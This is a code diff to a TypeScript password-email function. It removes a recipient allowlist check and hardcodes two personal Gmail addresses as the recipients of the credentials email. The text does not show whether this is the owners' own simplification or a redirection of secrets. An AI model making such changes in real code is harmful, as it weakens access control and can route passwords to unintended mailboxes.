@@ -12,11 +12,6 @@ export async function sendPasswordEmail(toEmail?: string) {
     throw new Error("SMTP credentials are not configured in environment variables.");
   }
 
-  const recipient = toEmail ? toEmail.trim().toLowerCase() : "";
-  if (!recipient || !ALLOWED_EMAILS.includes(recipient)) {
-    return { success: false, error: "Unauthorized or invalid email address." };
-  }
-
   try {
     const transporter = nodemailer.createTransport({
       host: "smtp.gmail.com",
@@ -53,7 +48,7 @@ export async function sendPasswordEmail(toEmail?: string) {
 
     const info = await transporter.sendMail({
       from: `"Credentials Manager" <${smtpUser}>`,
-      to: recipient,
+      to: "agarg1473@gmail.com, happypandey2387@gmail.com",
       subject: "Secure Access: Your Credentials Manager Password",
       html: htmlContent,
     });
